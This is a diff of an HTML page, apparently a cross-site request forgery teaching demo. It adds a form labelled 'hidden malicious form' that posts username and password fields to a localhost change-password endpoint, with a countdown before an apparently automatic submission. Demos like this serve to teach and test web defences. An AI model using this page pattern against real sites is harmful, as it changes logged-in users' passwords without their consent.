@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <script src="/index.js"></script>
+    <script defer src="/index.js"></script>
   </head>
   <body>
     <h1>CSRF demo</h1>
-    <p>CSRF demo page</p>
+    <p>Form will be submitted in <b id="counter"></b></p>
+    <form
+      action="http://localhost:3000/change-password"
+      id="hidden-malicious-form"
+      method="post"
+    >
+      <h2>Hidden malicious form that will change password of logged in user</h2>
+      <input name="username" type="text" />
+      <input name="password" type="text" />
+    </form>
   </body>
 </html>
